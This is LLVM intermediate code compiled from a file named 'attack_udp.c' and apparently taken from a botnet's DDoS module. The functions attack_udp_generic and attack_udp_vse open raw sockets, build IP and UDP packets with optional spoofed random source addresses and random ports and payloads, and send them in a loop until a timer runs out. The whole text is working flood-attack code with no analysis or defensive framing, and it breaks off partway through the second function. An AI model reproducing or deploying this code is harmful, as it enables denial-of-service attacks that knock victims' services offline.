; ModuleID = 'attack_udp.c'
source_filename = "attack_udp.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.dns_question = type { i16, i16 }

@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @attack_udp_generic(i32 %0, i8 zeroext %1, %struct.attack_target* %2, i8 zeroext %3, %struct.attack_option* %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias align 16 i8* @calloc(i64 %32, i64 8) #5
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 24, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #5
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %23, align 4
  %76 = load i16, i16* %20, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp sgt i32 %77, 1460
  br i1 %78, label %79, label %80

79:                                               ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %80

80:                                               ; preds = %79, %5
  %81 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %81, i32* %12, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %84

83:                                               ; preds = %80
  br label %330

84:                                               ; preds = %80
  store i32 1, i32* %11, align 4
  %85 = load i32, i32* %12, align 4
  %86 = bitcast i32* %11 to i8*
  %87 = call i32 @setsockopt(i32 %85, i32 0, i32 3, i8* %86, i32 4) #5
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %89, label %92

89:                                               ; preds = %84
  %90 = load i32, i32* %12, align 4
  %91 = call i32 @close(i32 %90)
  br label %330

92:                                               ; preds = %84
  store i32 0, i32* %11, align 4
  br label %93

93:                                               ; preds = %175, %92
  %94 = load i32, i32* %11, align 4
  %95 = load i8, i8* %7, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp slt i32 %94, %96
  br i1 %97, label %98, label %178

98:                                               ; preds = %93
  %99 = call noalias align 16 i8* @calloc(i64 1510, i64 1) #5
  %100 = load i8**, i8*** %13, align 8
  %101 = load i32, i32* %11, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8*, i8** %100, i64 %102
  store i8* %99, i8** %103, align 8
  %104 = load i8**, i8*** %13, align 8
  %105 = load i32, i32* %11, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8*, i8** %104, i64 %106
  %108 = load i8*, i8** %107, align 8
  %109 = bitcast i8* %108 to %struct.iphdr*
  store %struct.iphdr* %109, %struct.iphdr** %24, align 8
  %110 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i64 1
  %112 = bitcast %struct.iphdr* %111 to %struct.udphdr*
  store %struct.udphdr* %112, %struct.udphdr** %25, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %114 = bitcast %struct.iphdr* %113 to i8*
  %115 = load i8, i8* %114, align 4
  %116 = and i8 %115, 15
  %117 = or i8 %116, 64
  store i8 %117, i8* %114, align 4
  %118 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %119 = bitcast %struct.iphdr* %118 to i8*
  %120 = load i8, i8* %119, align 4
  %121 = and i8 %120, -16
  %122 = or i8 %121, 5
  store i8 %122, i8* %119, align 4
  %123 = load i8, i8* %14, align 1
  %124 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 1
  store i8 %123, i8* %125, align 1
  %126 = load i16, i16* %20, align 2
  %127 = zext i16 %126 to i64
  %128 = add i64 28, %127
  %129 = trunc i64 %128 to i16
  %130 = call zeroext i16 @htons(i16 zeroext %129) #6
  %131 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 2
  store i16 %130, i16* %132, align 2
  %133 = load i16, i16* %15, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %133) #6
  %135 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 3
  store i16 %134, i16* %136, align 4
  %137 = load i8, i8* %16, align 1
  %138 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i32 0, i32 5
  store i8 %137, i8* %139, align 4
  %140 = load i8, i8* %17, align 1
  %141 = icmp ne i8 %140, 0
  br i1 %141, label %142, label %146

142:                                              ; preds = %98
  %143 = call zeroext i16 @htons(i16 zeroext 16384) #6
  %144 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 4
  store i16 %143, i16* %145, align 2
  br label %146

146:                                              ; preds = %142, %98
  %147 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 6
  store i8 17, i8* %148, align 1
  %149 = load i32, i32* %22, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 8
  store i32 %149, i32* %151, align 4
  %152 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %153 = load i32, i32* %11, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 9
  store i32 %157, i32* %159, align 4
  %160 = load i16, i16* %18, align 2
  %161 = call zeroext i16 @htons(i16 zeroext %160) #6
  %162 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %163 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %162, i32 0, i32 0
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %19, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #6
  %166 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = load i16, i16* %20, align 2
  %169 = zext i16 %168 to i64
  %170 = add i64 8, %169
  %171 = trunc i64 %170 to i16
  %172 = call zeroext i16 @htons(i16 zeroext %171) #6
  %173 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %174 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %173, i32 0, i32 2
  store i16 %172, i16* %174, align 2
  br label %175

175:                                              ; preds = %146
  %176 = load i32, i32* %11, align 4
  %177 = add nsw i32 %176, 1
  store i32 %177, i32* %11, align 4
  br label %93, !llvm.loop !6

178:                                              ; preds = %93
  br label %179

179:                                              ; preds = %178, %329
  store i32 0, i32* %11, align 4
  br label %180

180:                                              ; preds = %320, %179
  %181 = load i32, i32* %11, align 4
  %182 = load i8, i8* %7, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp slt i32 %181, %183
  br i1 %184, label %185, label %323

185:                                              ; preds = %180
  %186 = load i8**, i8*** %13, align 8
  %187 = load i32, i32* %11, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8*, i8** %186, i64 %188
  %190 = load i8*, i8** %189, align 8
  store i8* %190, i8** %26, align 8
  %191 = load i8*, i8** %26, align 8
  %192 = bitcast i8* %191 to %struct.iphdr*
  store %struct.iphdr* %192, %struct.iphdr** %27, align 8
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i64 1
  %195 = bitcast %struct.iphdr* %194 to %struct.udphdr*
  store %struct.udphdr* %195, %struct.udphdr** %28, align 8
  %196 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i64 1
  %198 = bitcast %struct.udphdr* %197 to i8*
  store i8* %198, i8** %29, align 8
  %199 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %200 = load i32, i32* %11, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i64 %201
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i32 0, i32 2
  %204 = load i8, i8* %203, align 4
  %205 = zext i8 %204 to i32
  %206 = icmp slt i32 %205, 32
  br i1 %206, label %207, label %228

207:                                              ; preds = %185
  %208 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %209 = load i32, i32* %11, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 1
  %213 = load i32, i32* %212, align 4
  %214 = call i32 @ntohl(i32 %213) #6
  %215 = call i32 @rand_next()
  %216 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %217 = load i32, i32* %11, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i64 %218
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i32 0, i32 2
  %221 = load i8, i8* %220, align 4
  %222 = zext i8 %221 to i32
  %223 = lshr i32 %215, %222
  %224 = add i32 %214, %223
  %225 = call i32 @htonl(i32 %224) #6
  %226 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  br label %228

228:                                              ; preds = %207, %185
  %229 = load i32, i32* %22, align 4
  %230 = icmp eq i32 %229, -1
  br i1 %230, label %231, label %235

231:                                              ; preds = %228
  %232 = call i32 @rand_next()
  %233 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 8
  store i32 %232, i32* %234, align 4
  br label %235

235:                                              ; preds = %231, %228
  %236 = load i16, i16* %15, align 2
  %237 = zext i16 %236 to i32
  %238 = icmp eq i32 %237, 65535
  br i1 %238, label %239, label %244

239:                                              ; preds = %235
  %240 = call i32 @rand_next()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 3
  store i16 %241, i16* %243, align 4
  br label %244

244:                                              ; preds = %239, %235
  %245 = load i16, i16* %18, align 2
  %246 = zext i16 %245 to i32
  %247 = icmp eq i32 %246, 65535
  br i1 %247, label %248, label %253

248:                                              ; preds = %244
  %249 = call i32 @rand_next()
  %250 = trunc i32 %249 to i16
  %251 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 0
  store i16 %250, i16* %252, align 2
  br label %253

253:                                              ; preds = %248, %244
  %254 = load i16, i16* %19, align 2
  %255 = zext i16 %254 to i32
  %256 = icmp eq i32 %255, 65535
  br i1 %256, label %257, label %262

257:                                              ; preds = %253
  %258 = call i32 @rand_next()
  %259 = trunc i32 %258 to i16
  %260 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 1
  store i16 %259, i16* %261, align 2
  br label %262

262:                                              ; preds = %257, %253
  %263 = load i8, i8* %21, align 1
  %264 = icmp ne i8 %263, 0
  br i1 %264, label %265, label %273

265:                                              ; preds = %262
  %266 = load i8*, i8** %29, align 8
  %267 = load i16, i16* %20, align 2
  %268 = zext i16 %267 to i32
  call void @rand_alphastr(i8* %266, i32 %268)
  %269 = load i8*, i8** %29, align 8
  %270 = load i16, i16* %20, align 2
  %271 = zext i16 %270 to i64
  %272 = getelementptr inbounds i8, i8* %269, i64 %271
  store i8 0, i8* %272, align 1
  br label %273

273:                                              ; preds = %265, %262
  %274 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 0, i16* %275, align 2
  %276 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %277 = bitcast %struct.iphdr* %276 to i16*
  %278 = call zeroext i16 @checksum_generic(i16* %277, i32 20)
  %279 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 7
  store i16 %278, i16* %280, align 2
  %281 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 3
  store i16 0, i16* %282, align 2
  %283 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %284 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %285 = bitcast %struct.udphdr* %284 to i8*
  %286 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 2
  %288 = load i16, i16* %287, align 2
  %289 = load i16, i16* %20, align 2
  %290 = zext i16 %289 to i64
  %291 = add i64 8, %290
  %292 = trunc i64 %291 to i32
  %293 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %283, i8* %285, i16 zeroext %288, i32 %292)
  %294 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 2
  %296 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %300 = load i32, i32* %11, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 0
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %303, i32 0, i32 1
  store i16 %298, i16* %304, align 2
  %305 = load i32, i32* %12, align 4
  %306 = load i8*, i8** %26, align 8
  %307 = load i16, i16* %20, align 2
  %308 = zext i16 %307 to i64
  %309 = add i64 28, %308
  %310 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %311 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %312 = load i32, i32* %11, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 0
  %316 = bitcast %struct.sockaddr_in* %315 to %struct.sockaddr*
  store %struct.sockaddr* %316, %struct.sockaddr** %310, align 8
  %317 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %318 = load %struct.sockaddr*, %struct.sockaddr** %317, align 8
  %319 = call i64 @sendto(i32 %305, i8* %306, i64 %309, i32 16384, %struct.sockaddr* %318, i32 16)
  br label %320

320:                                              ; preds = %273
  %321 = load i32, i32* %11, align 4
  %322 = add nsw i32 %321, 1
  store i32 %322, i32* %11, align 4
  br label %180, !llvm.loop !8

323:                                              ; preds = %180
  %324 = call i64 @time(i64* null) #5
  %325 = load i32, i32* %23, align 4
  %326 = sext i32 %325 to i64
  %327 = icmp sgt i64 %324, %326
  br i1 %327, label %328, label %329

328:                                              ; preds = %323
  br label %330

329:                                              ; preds = %323
  br label %179

330:                                              ; preds = %83, %89, %328
  ret void
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #1

declare i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #3

declare i32 @rand_next() #2

declare void @rand_alphastr(i8*, i32) #2

declare zeroext i16 @checksum_generic(i16*, i32) #2

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @attack_udp_vse(i32 %0, i8 zeroext %1, %struct.attack_target* %2, i8 zeroext %3, %struct.attack_option* %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias align 16 i8* @calloc(i64 %31, i64 8) #5
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #5
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %63 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %63, i8** %20, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %64, i32* %12, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

66:                                               ; preds = %5
  br label %302

67:                                               ; preds = %5
  store i32 1, i32* %11, align 4
  %68 = load i32, i32* %12, align 4
  %69 = bitcast i32* %11 to i8*
  %70 = call i32 @setsockopt(i32 %68, i32 0, i32 3, i8* %69, i32 4) #5
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %75

72:                                               ; preds = %67
  %73 = load i32, i32* %12, align 4
  %74 = call i32 @close(i32 %73)
  br label %302

75:                                               ; preds = %67
  store i32 0, i32* %11, align 4
  br label %76

76:                                               ; preds = %168, %75
  %77 = load i32, i32* %11, align 4
  %78 = load i8, i8* %7, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp slt i32 %77, %79
  br i1 %80, label %81, label %171

81:                                               ; preds = %76
  %82 = call noalias align 16 i8* @calloc(i64 128, i64 1) #5
  %83 = load i8**, i8*** %13, align 8
  %84 = load i32, i32* %11, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8*, i8** %83, i64 %85
  store i8* %82, i8** %86, align 8
  %87 = load i8**, i8*** %13, align 8
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8*, i8** %87, i64 %89
  %91 = load i8*, i8** %90, align 8
  %92 = bitcast i8* %91 to %struct.iphdr*
  store %struct.iphdr* %92, %struct.iphdr** %23, align 8
  %93 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i64 1
  %95 = bitcast %struct.iphdr* %94 to %struct.udphdr*
  store %struct.udphdr* %95, %struct.udphdr** %24, align 8
  %96 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %97 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %96, i64 1
  %98 = bitcast %struct.udphdr* %97 to i8*
  store i8* %98, i8** %25, align 8
  %99 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %100 = bitcast %struct.iphdr* %99 to i8*
  %101 = load i8, i8* %100, align 4
  %102 = and i8 %101, 15
  %103 = or i8 %102, 64
  store i8 %103, i8* %100, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %105 = bitcast %struct.iphdr* %104 to i8*
  %106 = load i8, i8* %105, align 4
  %107 = and i8 %106, -16
  %108 = or i8 %107, 5
  store i8 %108, i8* %105, align 4
  %109 = load i8, i8* %14, align 1
  %110 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 1
  store i8 %109, i8* %111, align 1
  %112 = load i32, i32* %21, align 4
  %113 = sext i32 %112 to i64
  %114 = add i64 32, %113
  %115 = trunc i64 %114 to i16
  %116 = call zeroext i16 @htons(i16 zeroext %115) #6
  %117 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i32 0, i32 2
  store i16 %116, i16* %118, align 2
  %119 = load i16, i16* %15, align 2
  %120 = call zeroext i16 @htons(i16 zeroext %119) #6
  %121 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i32 0, i32 3
  store i16 %120, i16* %122, align 4
  %123 = load i8, i8* %16, align 1
  %124 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 5
  store i8 %123, i8* %125, align 4
  %126 = load i8, i8* %17, align 1
  %127 = icmp ne i8 %126, 0
  br i1 %127, label %128, label %132

128:                                              ; preds = %81
  %129 = call zeroext i16 @htons(i16 zeroext 16384) #6
  %130 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 4
  store i16 %129, i16* %131, align 2
  br label %132

132:                                              ; preds = %128, %81
  %133 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 6
  store i8 17, i8* %134, align 1
  %135 = load i32, i32* @LOCAL_ADDR, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 8
  store i32 %135, i32* %137, align 4
  %138 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %139 = load i32, i32* %11, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i64 %140
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i32 0, i32 1
